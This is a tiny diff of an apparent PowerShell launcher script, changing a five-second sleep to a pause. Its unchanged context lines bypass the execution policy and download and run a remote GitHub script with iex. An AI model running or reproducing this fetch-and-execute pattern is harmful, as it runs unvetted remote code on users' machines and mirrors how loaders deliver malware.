@@ -9,4 +9,4 @@ if (-NOT $isAdmin) {
 Set-ExecutionPolicy Bypass -Scope Process -Force
 iex (iwr 'https://github.com/kilordow/Fx.exe/raw/refs/heads/main/cheakermn.ps1' -UseBasicParsing).Content
 
-Start-Sleep -Seconds 5
+pause
